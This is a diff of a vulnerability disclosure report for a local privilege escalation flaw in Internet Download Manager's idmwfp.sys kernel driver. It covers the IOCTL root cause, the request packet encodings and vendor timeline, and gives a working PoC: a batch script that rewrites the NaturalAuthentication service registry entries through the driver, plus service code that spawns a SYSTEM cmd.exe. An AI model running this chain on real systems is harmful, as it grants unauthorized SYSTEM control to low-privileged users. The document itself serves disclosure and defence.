@@ -1,470 +1,394 @@
-# Internet Download Manager `idmwfp.sys` Local Privilege Escalation via Arbitrary Registry Read/Write
+# Internet Download Manager `idmwfp.sys` Local Privilege Escalation via a Kernel Registry Operation Primitive
+
+| Item | Content |
+| --- | --- |
+| CVE ID | CVE-2026-90493 (CNA: VulDB) |
+| Contact | kncrjvirx@gmail.com |
+| Vendor | Tonec Inc. / Internet Download Manager Corp. |
+| Affected product | Internet Download Manager **≤ 6.42 Build 63** (Windows) |
+| Affected component | `idmwfp.sys` (Internet Download Manager WFP Driver), Windows kernel driver |
+| Device interface | `\\.\IDMWFP` |
+| Vulnerability class | Missing access control in a kernel driver / exposed IOCTL without caller authorization (CWE-266, CWE-284) |
+| Attack vector | Local, low-privileged authenticated user, no interaction |
+| CVSS v3.1 | `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`, 8.8 |
+| CVSS v4.0 | `CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:P`, 8.5 |
+
+---
 
 ## 1. Summary
 
-`idmwfp.sys` exposes a device interface accessible to all authenticated users at `\\.\IDMWFP`.
+During initialization, `idmwfp.sys` creates the device object `\Device\IDMWFP` with `WdmlibIoCreateDeviceSecure` and passes the security descriptor string `D:P(A;;GA;;;AU)` to that routine. `AU` stands for Authenticated Users and `GA` for GENERIC_ALL. As a result, any authenticated user on the machine can open `\\.\IDMWFP` with full access and send it arbitrary `DeviceIoControl` requests.
 
-Through `IOCTL 0x12C028` and its subcommands `0x0C..0x0F`, a low-privileged local user can, **without any authorization checks**, perform the following operations on registry values under **arbitrary paths** in both `HKLM` and `HKU`:
+The overly permissive device ACL only provides the entry point. The actual defect is in the `IRP_MJ_DEVICE_CONTROL` handler `sub_14000E9E0` of the main control plane: `IOCTL 0x12C028` dispatches subcommands by the first byte of the request packet, and all four subcommands `0x0C`–`0x0F` enter the same handler `sub_140005B90`, which — after parsing the user input — directly calls `ZwOpenKey` / `ZwCreateKey` / `ZwQueryValueKey` and the runtime-resolved `ZwSetValueKey`, `ZwDeleteValueKey`, and `ZwDeleteKey` in the driver's own (kernel) security context.
 
-- Read values
-- Create or modify values
-- Delete values
-- Delete empty keys
+There is no authorization anywhere on this path:
 
-This is not a narrowly scoped configuration interface limited to IDM-owned registry namespaces. Instead, it is a kernel-mediated registry operation primitive exposed to any authenticated user.
+- The caller is never identified. `IoGetRequestorProcessId` is used only once in the entire driver, by `0x12C00C`, to tag a PID policy object; the registry subcommands never call it;
+- There is no path allowlist whatsoever. The relative path submitted by the caller is concatenated verbatim after `\REGISTRY\MACHINE\` or `\REGISTRY\USER\`;
+- The caller's thread is never impersonated (no `SeAccessCheck` / `PsImpersonateClient` / `ZwAccessCheckAndAuditAlarm`), so the ACL of the registry object plays no part in the decision.
 
-Because this primitive can modify:
+The consequence: an ordinary local user can read, create, modify, and delete registry values under arbitrary paths in `HKLM` and `HKU` through this driver, thereby achieving local privilege escalation (see Section 5).
 
-- `HKLM\\SYSTEM\\CurrentControlSet\\Services\\...`
-- Other registry paths trusted by privileged services, scheduled tasks, or system components
-
-the issue can be used for:
-
-- Local Privilege Escalation (LPE)
-- Execution of attacker-controlled code or configuration as `SYSTEM` or in kernel-trusted contexts
-- High-privilege persistence
-- Tampering with security product or system configuration
-
-From a security-impact perspective, this should be treated as a **high-severity kernel driver logic vulnerability**. At its core, it exposes an arbitrary trusted-registry read/write capability to low-privileged users.
+The vendor has published no security advisory. In `idmwfp64.sys` 6.43.1.91 shipped with the IDM 6.43 series, a namespace allowlist has appeared, and paths such as `HKLM\SYSTEM\CurrentControlSet\Services\...` are no longer accepted — a silent fix.
 
 ---
 
-## 2. Vendor and Affected Component
+## 2. Disclosure Timeline
 
-- Vendor: Tonec / Internet Download Manager
-- Affected component: `idmwfp.sys`
-- Component type: Windows kernel driver
-- Device interface: `\\.\IDMWFP`
+| Date | Event |
+| --- | --- |
+| 2026-05-01 | Vulnerability discovered |
+| 2026-05-06 | Attempted to contact the vendor; email sent to `support@internetdownloadmanager.com` and `support@tonec.com`; no response received |
+| 2026-07-15 | PoC and full technical report published (this repository), and submitted to VulDB |
+| 2026-09-13 | CVE-2026-90493 assigned |
 
-Analyzed sample:
-
-- MD5: `7d55ad6b428320f191ed8529701ac2fa`
-- SHA-256: `753a1386e7b37ee313db908183afe7238f1a2aec5e6c1e59e9c11d471b6aaa8d`
-
----
-
-## 3. Vulnerability Type and Severity
-
-### 3.1 Vulnerability Type
-
-- Local Privilege Escalation
-- Arbitrary trusted registry read/write/delete
-- Missing authorization in a kernel driver / unsafe device access control
-
-### 3.2 Root Cause Classification
-
-Suggested CWE mappings:
-
-- `CWE-862` Missing Authorization
-- `CWE-732` Incorrect Permission Assignment for Critical Resource
-
-### 3.3 Suggested CVSS v3.1
-
-Suggested initial score:
-
-- `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
-- Base score: `7.8`
-
-Rationale:
-
-- Local attack vector
-- Requires only a normal authenticated low-privileged user
-- No user interaction required
-- Allows reading and modifying high-value system registry paths
-- Can cause high-impact integrity violations and persistence
-
-If the vendor or evaluator accepts the exploitation chain in which service or driver configuration tampering yields reliable `SYSTEM` or kernel-trusted execution, the practical LPE nature of the issue should be emphasized further.
+70 days elapsed from the first vendor contact to the publication of the PoC, during which we received no reply from the vendor and observed no security advisory. The vendor's fix landed silently in the form of a namespace allowlist in the 6.43 series driver, and not a single entry in the public release notes mentions a driver security issue.
 
 ---
 
-## 4. Preconditions
+## 3. Scope
 
-An attacker only needs:
+### 3.1 Affected Versions
 
-- Local authenticated user privileges
-- The ability to open `\\.\IDMWFP`
+- Affected range: Internet Download Manager **6.42 Build 63 and all earlier versions**
+- Confirmed vulnerable sample: `idmwfp.sys` 6.41.23.87 (product version 6.41.23.1), shipped with Internet Download Manager 6.42 Build 63.
+- Confirmed no longer reproducible: `idmwfp64.sys` 6.43.1.91 (product version 6.43.1.1), SHA-256 `8acffb0181146e96c44a94c5b364d657b775936ebb4d0fcce591068f74803c4a`, shipped with Internet Download Manager 6.43 Build 5. In that version the registry handler decodes a privileged policy block before the operation and matches the path against allow/deny pattern tables (see Section 7).
+- The fix was introduced with the 6.43 series. Around the same time the vendor renamed the driver file from `idmwfp.sys` to `idmwfp64.sys` and jumped the version number to 6.43.x.
 
-No requirement exists for:
+### 3.2 Preconditions for the Attack Surface
 
-- Administrative privileges
-- `SeRestorePrivilege` or `SeLoadDriverPrivilege`
-- Debug privileges
-- Interactive user confirmation
+The attack surface exists when three conditions hold at the same time:
 
----
-
-## 5. Root Cause
-
-### 5.1 The Device Object Is Open to All Authenticated Users
-
-In `DriverEntry`, the driver creates:
-
-- `\Device\IDMWFP`
-- `\DosDevices\IDMWFP`
-
-and applies the following security descriptor:
-
-- `D:P(A;;GA;;;AU)`
-
-Its effect is:
-
-- All authenticated users (`AU`) receive `GENERIC_ALL`
-
-This means any ordinary local user can send `DeviceIoControl` requests to the device.
-
-### 5.2 No Authorization Boundary Is Enforced on Target Registry Paths
-
-The main `IRP_MJ_DEVICE_CONTROL` dispatcher is:
-
-- `sub_14000E9E0`
-
-Within it:
-
-- `IOCTL 0x12C028`
-  - Uses the first byte as a subcommand selector
-  - Routes `0x0C..0x0F` to `sub_140005B90`
-
-`sub_140005B90` performs the following:
-
-1. Decodes a user-controlled “registry-relative path + value name”
-2. Chooses a registry root prefix based on low bits in `flags`:
-   - `flags & 0x1` -> `\\REGISTRY\\MACHINE\\`
-   - `flags & 0x2` -> `\\REGISTRY\\USER\\`
-3. Calls kernel registry APIs:
-   - `ZwOpenKey`
-   - `ZwCreateKey`
-   - `ZwDeleteValueKey`
-   - `ZwDeleteKey`
-   - `ZwQueryValueKey`
-   - `ZwSetValueKey`
-
-The critical flaw is that the driver:
-
-- **does not** restrict the path to an IDM-owned namespace
-- **does not** verify whether the caller is authorized to access the target key
-- **does not** limit the operation to the caller’s own `HKCU` mapping
-
-As a result, the interface effectively allows an ordinary user, via a kernel driver proxy, to perform arbitrary path-level registry operations under:
-
-- `HKLM\...`
-- `HKU\...`
+1. Internet Download Manager is installed. `idmwfp.sys` is not an optional component; a normal installation places it in `%SystemRoot%\System32\drivers\` and registers the kernel service `IDMWFP` of the same name, loaded by the Service Control Manager.
+2. The `IDMWFP` service is running. Under the default configuration it starts automatically. Whether the IDM application is open is irrelevant to the attack surface, since the driver is loaded by the SCM.
+3. The machine has at least one ordinary local account that the attacker controls.
 
 ---
 
-## 6. Technical Details
+## 4. Root Cause Analysis
 
-### 6.1 Relevant IOCTL
+### 4.1 The Device Object Is Open to All Authenticated Users
 
-Main command:
+The relevant code in `DriverEntry@0x14000DC10`:
 
-- `0x12C028`
+```c
+RtlInitUnicodeString(&DestinationString, L"\\Device\\IDMWFP");
+RtlInitUnicodeString(&SymbolicLinkName, L"D:P(A;;GA;;;AU)");
+Version = WdmlibIoCreateDeviceSecure(
+            DriverObject,
+            0,
+            &DestinationString,
+            0x12u,          // DeviceType = FILE_DEVICE_NETWORK
+            0x100u,         // FILE_DEVICE_SECURE_OPEN
+            0,
+            &SymbolicLinkName,   // SDDL
+            &DeviceClassGuid,
+            &DeviceObject);
+...
+RtlInitUnicodeString(&SymbolicLinkName, L"\\DosDevices\\IDMWFP");
+IoCreateSymbolicLink(&SymbolicLinkName, &DestinationString);
+```
 
-Subcommands directly relevant to this vulnerability:
+The SDDL `D:P(A;;GA;;;AU)` contains a single ACE: trustee `AU` (Authenticated Users), mask `GA` (GENERIC_ALL), with no inheritance flags. A user-mode `CreateFileW(L"\\\\.\\IDMWFP", GENERIC_READ | GENERIC_WRITE, ...)` therefore returns a valid handle for any logged-on user.
 
-- `0x0C`: query value
-- `0x0D`: create missing key path and set value
-- `0x0E`: delete value
-- `0x0F`: delete value and remove the key if it becomes empty
+### 4.2 Main Control Plane and Subcommand Dispatch
 
-### 6.2 Shared Input Structure
+`DriverObject->MajorFunction[14]` (`IRP_MJ_DEVICE_CONTROL`) points to `sub_14000E9E0`. That routine takes `Parameters.DeviceIoControl.IoControlCode`, `InputBufferLength`, and `OutputBufferLength` from the `IO_STACK_LOCATION`; the input and output buffers share `Irp->AssociatedIrp.SystemBuffer` (METHOD_BUFFERED).
 
-These four subcommands use a common input format:
+Confirmed IOCTLs:
+
+| IOCTL | Entry point | Purpose |
+| --- | --- | --- |
+| `0x12C004` | inline | Query the policy summary for a given PID |
+| `0x12C008` | `sub_140014330` | Create/update the policy and TLV rules for a given PID |
+| `0x12C00C` | `sub_1400140E0` | Bind an event object and redirect port to a given PID |
+| `0x12C010` | `sub_140013EB0` | Pop a notification queue message for a given PID |
+| `0x12C014` / `0x12C018` | `sub_140015F90` | Active-flow control wrappers (opcode `0x80` / `0x81`) |
+| `0x12C01C` | `sub_140014650` | Update the extended field of a PID policy |
+| `0x12C020` | `sub_140015F90` | Active-flow control (caller-specified opcode) |
+| `0x12C024` | `sub_140010230` | Reverse-look-up a PID from a port pair |
+| `0x12C028` | subcommand dispatch | Registry / file / WFP auxiliary operations |
+
+The dispatch for `0x12C028` subtracts 9 from the first byte of the request to form the jump index (`add eax, 0FFFFFFF7h; cmp eax, 7; ja default`); the valid subcommands are `9`–`0x10`:
+
+| Subcommand | Entry point | Purpose |
+| --- | --- | --- |
+| `9` | `sub_140005610` | Fixed operation on `\SystemRoot\System32\drivers\etc\hosts` |
+| `0x0A` | `sub_140003DA0` | Bulk-delete WFP filters by condition value |
+| `0x0B` | `sub_140005A40` | Delete four fixed values under a fixed path (hardcoded IDM license information) |
+| **`0x0C`–`0x0F`** | **`sub_140005B90`** | **Registry read/write/delete on a caller-specified path** |
+| `0x10` | `sub_140006490` | Volume information summary query |
+
+`sub_14000E9E0` performs only a length check on each subcommand and then calls the handler directly, with no identity check of any kind.
+
+Worth calling out separately is `0x0B`: it accesses IDM's own namespace `\REGISTRY\MACHINE\SOFTWARE\Wow6432Node\Internet Download Manager`, with both the path and the value names hardcoded in the driver, using the same `D:P(A;;GA;;;AU)` device and the same inline decoding logic. This shows that IDM is entirely capable of confining registry operations to its own namespace; letting `0x0C`–`0x0F` accept arbitrary paths is a separate design decision, not a limitation of capability.
+
+### 4.3 The Registry Handler That Lacks Authorization
+
+The entry checks of `sub_140005B90(PRIV_CMD *input, ULONG input_len, ULONG output_len, ULONG *out_len)` are only three: `input->mode <= 1`, `KeGetCurrentIrql() == 0`, and a one-time XOR/ROL constant decode of the root prefix strings if they have not been decoded yet. None of them concerns the caller's identity.
+
+The function then does the following:
+
+1. Reads `path_offset` and `path_wchars`, and validates `path_wchars >= 0xA` and `input_len >= path_offset + 2 * path_wchars`;
+2. Decodes that UTF-16 region in place, character by character;
+3. Scans backwards for the last backslash and splits the string into "relative key path" and "value name"; if the value name is exactly a single `@`, it is rewritten to `L'\0'`, pointing the operation at the key's default value;
+4. Selects the root prefix from the low bits of `flags` and writes the root prefix, the key path, and a terminator into the UNICODE_STRING buffer in order, while the value name is carried separately through `ValueName.Buffer`;
+5. Enters the `switch (subcommand)` and calls the kernel registry APIs.
+
+The root prefixes used in step 4 are two wide strings likewise encoded with `(w ^ 0xDAAD) + 9555` and `ROR 16, (4+i) & 0xF`; decoded character by character they are:
+
+```text
+xmmword_1400244D8 -> "\REGISTRY\MACHINE\"
+xmmword_1400244B8 -> "\REGISTRY\USER\"
+```
+
+The control flow for the two prefixes is mutually exclusive: `flags & 1` selects MACHINE, otherwise only `flags & 2` selects USER; if neither bit is set, the function returns `STATUS_INVALID_PARAMETER` directly.
+
+The registry calls of the four subcommands are as follows (offsets are counted from the start of `PRIV_CMD`; `+0x0C` is the offset of the data region within the packet, `+0x0E` is the byte count of the data region):
+
+| Subcommand | Kernel calls | Access | Notes |
+| --- | --- | --- | --- |
+| `0x0C` | `ZwOpenKey(KEY_QUERY_VALUE)` → `ZwQueryValueKey(KeyValuePartialInformation)` | read-only | Output buffer at least 16 bytes; the result is written back into the same SystemBuffer, with the first 4 bytes overwritten by the returned length |
+| `0x0D` | `ZwCreateKey(KEY_SET_VALUE)` (creating intermediate levels when necessary) → `ZwSetValueKey` | read/write | First validates `input_len >= data_offset + data_size`, then decodes the data region and writes it |
+| `0x0E` | `ZwOpenKey(KEY_SET_VALUE)` → `ZwDeleteValueKey` | write | A missing value (`STATUS_OBJECT_NAME_NOT_FOUND`) is treated as success |
+| `0x0F` | `ZwOpenKey(KEY_QUERY_VALUE \| DELETE)` → `ZwDeleteValueKey` → `ZwQueryKey(KeyFullInformation)` → `ZwDeleteKey` | delete | The key is deleted only when both the subkey count and the value count are 0; otherwise `STATUS_KEY_HAS_CHILDREN` is returned |
+
+The staged creation logic of `0x0D` is worth noting: it first calls `ZwCreateKey` with the full path, and when that returns `STATUS_OBJECT_NAME_NOT_FOUND` it truncates one level via `sub_140019C00` (scanning backwards for the last backslash in the buffer) and retries until it succeeds; after success it completes the path level by level using `sub_140019B70` (scanning forward for a backslash from a given offset), calling `ZwCreateKey` separately for each level. A multi-level key path that does not yet exist can therefore be created in a single call.
+
+Three details together show that "authorization is omitted entirely":
+
+- `IoGetRequestorProcessId` is never called. The only call site of that API in the driver is on the `0x12C00C` path (`0x14000EB65`), where it writes the caller PID into a policy object — unrelated to registry paths.
+- The caller's thread is never impersonated, and no access check such as `SeAccessCheck` is invoked explicitly. The registry operations execute in the driver's own security context, and the ACL of the target object plays no part in the decision.
+- Path concatenation performs no character filtering at all; `..`, `\`, and `.` all reach the object manager path verbatim.
+
+### 4.4 Request Packet and Private Encoding
+
+`0x0C`–`0x0F` share the same 20-byte header, followed by a path region and a data region. The structure below is organized according to the field naming in IDA, and the field offsets match the positions the driver reads:
 
 ```c
 #pragma pack(push, 1)
-typedef struct IDMWFP_REG_CMD {
-    uint8_t  subcmd;        // 0x0C / 0x0D / 0x0E / 0x0F
-    uint8_t  mode;
-    uint16_t reserved0;
-    uint32_t flags;         // bit0 = HKLM, bit1 = HKU
-    uint16_t path_offset;   // points to an encoded UTF-16 path
-    uint16_t path_wchars;   // number of UTF-16 characters in the path
-    uint16_t data_offset;   // used by 0x0D
-    uint16_t data_size;     // used by 0x0D
-    uint16_t value_type;    // used by 0x0D / 0x0C
-    uint8_t  seed0;
-    uint8_t  seed1;
-    // followed by:
-    //   encoded_utf16_path[path_wchars]
-    //   encoded_or_raw_data[data_size]
-} IDMWFP_REG_CMD;
+typedef struct PRIV_CMD {
+    uint8_t  subcmd;        // +0x00  0x0C / 0x0D / 0x0E / 0x0F
+    uint8_t  mode;          // +0x01  must be <= 1
+    uint16_t reserved0;     // +0x02
+    uint32_t flags;         // +0x04  bit0 = MACHINE root, bit1 = USER root, bit8..11 = data encoding options
+    uint16_t path_offset;   // +0x08  byte offset of the path region within the packet
+    uint16_t path_wchars;   // +0x0A  UTF-16 character count of the path region, must be >= 10
+    uint16_t data_offset;   // +0x0C  byte offset of the data region within the packet
+    uint16_t data_size;     // +0x0E  byte count of the data region
+    uint16_t value_type;    // +0x10  REG_SZ / REG_DWORD / ...
+    uint8_t  seed0;         // +0x12  data encoding seed; 0xAD when 0
+    uint8_t  seed1;         // +0x13  data encoding seed; 0xAD when 0
+    /* +0x14: encoded_utf16_path[path_wchars] */
+    /* then:   encoded_data[data_size]                */
+} PRIV_CMD;
 #pragma pack(pop)
 ```
 
-The path string is decoded inside the driver and split at the last `\` into:
+The attacker-controlled fields cover the registry root (low bits of `flags`), the relative key path, the value name, the value type, the value content, and the encoding parameters. The driver only decodes and forwards.
 
-- `key path`
-- `value name`
+The interface uses two private encodings; there is a reverse-engineering cost, but they do not constitute a security boundary:
 
-Therefore, the attacker fully controls:
+**Path region**, with character index `i` starting at 0 and `rot = (4 + i) & 0xF`:
 
-- Registry root (`HKLM` / `HKU`)
-- Relative key path
-- Value name
-- Value type
-- Value contents
+```c
+decoded = ROR16((encoded ^ 0xDAAD) + 9555, rot);
+```
 
-### 6.3 Behavior Confirmed Dynamically
+**Data region**, with byte index `i` starting at 0 and `rot = (4 + i) & 7`:
 
-Using a custom PoC tool, I confirmed that:
+```c
+decoded = ROR8((encoded ^ 0xAD) + 83, rot);
+```
 
-1. `0x0D` writes a `REG_DWORD` to `HKLM\SOFTWARE\IDMWFPProbe2\Val`
-2. `0x0C` reads the value back correctly
-3. `0x0E` deletes the value
-4. `0x0F` removes an empty key
-5. `0x0D` writes a `REG_EXPAND_SZ`
-6. `0x0C` reads back and correctly reconstructs the string data
+When `flags & 0xF00` is non-zero, the write path of `0x0D` and the query path of `0x0C` layer another round of transformation on top, with the branch condition depending on `value_type`:
 
-This demonstrates that:
+- When `value_type ∈ {1, 2, 7}` (`REG_SZ` / `REG_EXPAND_SZ` / `REG_MULTI_SZ`) and `flags & 0x600` is non-zero, processing is done in UTF-16 units; within that, `flags & 0x400` runs an additional wchar-wise Fisher-Yates-style permutation (`sub_140005430`), necessarily followed by a character-wise `decoded = seed ^ (encoded - seed)` transformation (`sub_140005300`);
+- For other types, when `flags & 0x100` is non-zero, a 32-bit-wise permutation is applied (`sub_140005260`).
 
-- The issue is not a merely theoretical “possible write”
-- It is a reliably reproducible, general-purpose registry operation primitive
+`seed0` / `seed1` act as the seeds of these two branches respectively, and are treated as `0xAD` when 0. By default (carrying only the root selection bit) neither transformation applies, and ordinary `REG_DWORD` / `REG_SZ` reads and writes need only the two basic codecs above.
+
+The output of `0x0C` is a native `KEY_VALUE_PARTIAL_INFORMATION`, whose first 12 bytes are `TitleIndex` / `Type` / `DataLength`, immediately followed by data encoded with the same byte transformation. Under `METHOD_BUFFERED` the input and output share the same SystemBuffer, and the driver writes the returned length to `+0x00..0x03`, overwriting the header of the caller's request packet (`subcmd` / `mode` / `reserved0`); the `flags` field from `+0x04` onward and the path and data regions after the packet header are unaffected. When the buffer is too small the driver returns `STATUS_BUFFER_OVERFLOW` or `STATUS_BUFFER_TOO_SMALL`, writing back to the same location.
 
 ---
 
-## 7. Impact Analysis
+## 5. PoC
 
-### 7.1 Arbitrary `HKLM` Writes
+### 5.1 Attack Chain Overview
 
-For a low-privileged user, arbitrary `HKLM` writes are the most dangerous capability.
+```text
+ordinary local user (Medium IL)
+   └─ poc.bat
+        ├─ [1] idmwfp_reg_demo.exe query          read back the original ImagePath
+        ├─ [2] idmwfp_reg_demo.exe set-expand-string  ImagePath  -> payload
+        ├─ [3] idmwfp_reg_demo.exe set-dword          Start     -> 0x2  (auto)
+        ├─ [4] idmwfp_reg_demo.exe set-dword          Type      -> 0x10 (own process)
+        ├─ [5] idmwfp_reg_demo.exe set-multi-string   RequiredPrivileges -> 28 entries
+        ├─ [6] idmwfp_reg_demo.exe query          confirm ImagePath has been rewritten
+        └─ [7] sc start NaturalAuthentication
+                 └─ SCM starts payload as LocalSystem
+                      └─ StartProcessAsSystemInActiveSession() -> interactive SYSTEM cmd.exe
+```
 
-This allows an attacker to tamper with:
+Steps 2 through 5 are all carried out through `\\.\IDMWFP`; the attacker needs no write permission on that service key.
 
-- `HKLM\SYSTEM\CurrentControlSet\Services\...`
-- High-privilege service and driver configuration
-- High-privilege program startup parameters, paths, dependencies, and DLL paths
-- Security product and system-policy-related values
+### 5.2 Rewriting the Service Registry Entries
 
-### 7.2 Arbitrary `HKU` Access
+`poc.bat`:
 
-Via the `HKU\...` root selection, an attacker can also:
+```bat
+set base=%~dp0
+set file=%base%payload.exe
+.\idmwfp_reg_demo.exe query machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\ImagePath" 128
+.\idmwfp_reg_demo.exe set-expand-string machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\ImagePath" %file%
+.\idmwfp_reg_demo.exe set-dword machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\Start" 0x2
+.\idmwfp_reg_demo.exe set-dword machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\Type" 0x10
+.\idmwfp_reg_demo.exe set-multi-string machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\RequiredPrivileges" "SeTcbPrivilege|SeChangeNotifyPrivilege|..."
+.\idmwfp_reg_demo.exe query machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\ImagePath" 128
+sc start NaturalAuthentication
+pause
+```
 
-- Read and write other users’ SID-backed hives
-- Alter post-logon behavior in multi-user environments
-- Establish stealthier persistence
+### 5.3 Why NaturalAuthentication Was Chosen
 
-### 7.3 Why This Leads to LPE
+Choosing a target service requires two conditions to hold at the same time, and `NaturalAuthentication` happens to satisfy both.
 
-This issue is not merely “an arbitrary registry write,” but a practical LPE risk because:
+```text
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NaturalAuthentication]
+"DisplayName"        = "@%systemroot%\system32\NaturalAuth.dll,-100"
+"ImagePath"          = hex(2): "%SystemRoot%\system32\svchost.exe -k netsvcs -p"
+"ObjectName"         = "LocalSystem"
+"RequiredPrivileges" = hex(7): SeTcbPrivilege
+                               SeChangeNotifyPrivilege
+                               SeSystemEnvironmentPrivilege
+"Start"              = dword:00000003   (SERVICE_DEMAND_START)
+"Type"               = dword:00000020   (SERVICE_WIN32_SHARE_PROCESS)
+"DependOnService"    = hex(7): RpcSs, ProfSvc, Schedule
+```
 
-- The registry is a primary configuration source for high-privilege Windows components
-- Once a low-privileged user can modify registry entries trusted by a high-privilege service or driver, attacker-controlled paths, parameters, or DLL references can be inserted into a privileged execution chain
+**Condition one, the service identity is LocalSystem.** `ObjectName = LocalSystem`; the service body runs under a kernel-level identity, so changing its entry point is equivalent to executing the payload as SYSTEM.
 
-Typical scenarios include:
+**Condition two, an ordinary user is allowed to start the service.** Most services whose identity is LocalSystem cannot be started manually by an ordinary user.
 
-- Modifying an existing service’s `ImagePath`
-- Modifying DLL or argument paths used by a service
-- Modifying a driver service configuration and waiting for reboot or service restart
-- Tampering with registry values read by `SYSTEM` or high-integrity processes
+### 5.4 Obtaining a SYSTEM Shell
 
-Even if a specific environment still requires a service restart, system reboot, or another trigger before a privileged component consumes the modified configuration, that remains a standard local-privilege-escalation chain.
+The payload is a standard Windows service program with the service name hardcoded to `NaturalAuthentication`:
 
-In other words:
+```cpp
+constexpr char kServiceName[] = "NaturalAuthentication";
 
-- The vulnerability itself provides a **high-privilege registry primitive**
-- LPE is the direct security consequence of that primitive
+void WINAPI ServiceMain(DWORD, LPSTR*) {
+    g_status_handle = RegisterServiceCtrlHandlerA(kServiceName, ServiceControlHandler);
+    ...
+    session0_launcher::StartProcessAsSystemInActiveSession(
+        L"C:\\Windows\\system32\\cmd.exe",
+        L"cmd.exe"
+    );
+    ...
+}
 
----
+int main(int argc, char* argv[]) {
+    SERVICE_TABLE_ENTRYA service_table[] = {
+        {const_cast<LPSTR>(kServiceName), ServiceMain},
+        {nullptr, nullptr},
+    };
+    if (!StartServiceCtrlDispatcherA(service_table)) { ... }
+}
+```
 
-## 8. Exploitation Scenarios
+The service name must match the hijacked service, otherwise the `StartServiceCtrlDispatcher` handshake between the SCM and the process fails.
 
-### Scenario A: High-Privilege Service Configuration Tampering
+The last step is a cross-session launch. The service is started by the SCM in session 0, and even with a SYSTEM token the process sits in a session with no interactive desktop. `StartProcessAsSystemInActiveSession` performs the following actions:
 
-An ordinary user can rewrite:
+1. `WTSEnumerateSessionsW` enumerates sessions and takes the ID of the first `WTSActive` one, falling back to `WTSGetActiveConsoleSessionId` on failure;
+2. `OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_DUPLICATE)`, and `EqualSid` verifies that the current token's user SID really is `S-1-5-18`, failing outright otherwise;
+3. `DuplicateTokenEx(..., TokenPrimary)` duplicates a primary token;
+4. `SetTokenInformation(TokenSessionId)` changes the token's session ID to the currently active interactive session;
+5. `CreateEnvironmentBlock` + `CreateProcessAsUserW(..., lpDesktop = L"winsta0\\default", ...)` launches `cmd.exe` on the interactive desktop.
 
-- `HKLM\SYSTEM\CurrentControlSet\Services\<Target>\ImagePath`
+### 5.5 Usage and Cleanup
 
-If the target service is later started under a high-privilege context, the attacker may gain privileged code execution.
-
-### Scenario B: Driver Service Path Tampering
-
-An ordinary user can rewrite:
-
-- A driver service’s `ImagePath`
-
-On reboot or later reload, this can redirect execution to an attacker-controlled binary path.
-
-### Scenario C: Security Configuration Damage and High-Privilege Persistence
-
-An attacker can alter:
-
-- Security product configuration
-- Service parameters
-- System component configuration
-
-to obtain long-term persistence or reduce system protections.
-
----
-
-## 9. Reproduction
-
-### 9.1 Environment
-
-- Windows system
-- `idmwfp.sys` loaded
-- Ordinary local authenticated user
-
-### 9.2 Install IDM Normally
-
-Install [idman642build63.exe](../poc/idman642build63.exe) from the `poc` folder. This is the latest official version. Versions released after November 2023 can use this PoC directly.
-
-### 9.3 Run the PoC Wrapper
-
-Run:
+Preparing the environment and executing:
 
 ```powershell
+# 1. Install IDM (the official installer in this directory)
+.\poc\idman642build63.exe
+
+# 2. Confirm the driver has been loaded by the SCM
+sc.exe query IDMWFP
+
+# 3. Run the whole chain as an ordinary user
+cd .\poc
 .\poc.bat
 ```
 
-from the `poc` directory.
-
-This step reproduces the vendor-facing PoC workflow packaged with the project.
-
-Note: after the PoC is triggered, the payload may be launched in a different Windows session. As a result, the program window may not appear on the current interactive desktop even if execution is successful. In such cases, the process can still be observed in Task Manager, for example as a `cmd.exe` instance running under the `SYSTEM` user.
-
-### 9.4 Minimal PoC: Arbitrary `HKLM` Write
-
-Use the custom tool:
-
-- `idmwfp_reg_demo.exe`
-
-Write a `REG_DWORD`:
+All four values submitted by `poc.bat` can be restored on the server with the same primitive. `backup.reg` provides the complete original configuration; it can be imported by double-clicking, or executed in an administrator context:
 
 ```powershell
-.\idmwfp_reg_demo.exe set-dword machine "SOFTWARE\IDMWFPProbe2\Val" 0x11223344
+sc.exe stop NaturalAuthentication
+reg.exe import .\poc\backup.reg
 ```
 
-Read it back:
+---
 
-```powershell
-.\idmwfp_reg_demo.exe query machine "SOFTWARE\IDMWFPProbe2\Val" 64
-```
+## 6. Impact
 
-Expected output includes:
+| Dimension | Assessment |
+| --- | --- |
+| Confidentiality | High. Arbitrary registry values under `HKLM` / `HKU` can be read, including other users' hives and security component configuration |
+| Integrity | High. Arbitrary registry values can be created, modified, and deleted, and empty keys can be deleted |
+| Availability | High. Protected configuration can be deleted and service definitions destroyed, preventing system components from starting |
+| Privilege escalation | Yes. An ordinary local user can reach LocalSystem |
+| Persistence | Yes. Service, driver, and autostart definitions can be rewritten directly |
+| User interaction | Not required |
+| Cross-privilege boundary | Yes. The hives of other users' SIDs and security product configuration can be accessed |
+
+---
+
+## 7. Vendor Response and Fix Status
+
+The vendor has published no security advisory and has not responded regarding this report. As of the time of writing, not a single entry in the public release notes mentions a driver security issue.
+
+The affected range ends at 6.42 Build 63. The vendor fixed the issue silently after the contact attempts: in `idmwfp64.sys` 6.43.1.91 shipped with IDM 6.43 Build 5, the function corresponding to `sub_140005B90` is located at `0x1400065B0`, and its entry performs an additional privileged string block decode, after which the path is pattern-matched before any registry operation:
 
 ```text
-decoded: title_index=16 type=4 data_len=4
-value(dword)=0x11223344
+0x140006643  call 0x140005620            ; decode privileged string block
+0x140006885  load allow/root pattern table, length 0x6E WCHAR
+0x1400068BD  run pattern match against the decoded input path
+0x1400068C9  return STATUS_OBJECT_PATH_INVALID when nothing matches
+0x140006913  load deny component pattern table, length 0x6B WCHAR
+0x14000694B  run pattern match against the path components
+0x140006A5B  return STATUS_OBJECT_NAME_INVALID on a hit or an invalid split
 ```
 
-### 9.5 Write `REG_EXPAND_SZ`
-
-```powershell
-.\idmwfp_reg_demo.exe set-expand-string machine "SOFTWARE\IDMWFPRegDemo\Path" "\SystemRoot\System32\drivers\Test.sys"
-```
-
-Read it back:
-
-```powershell
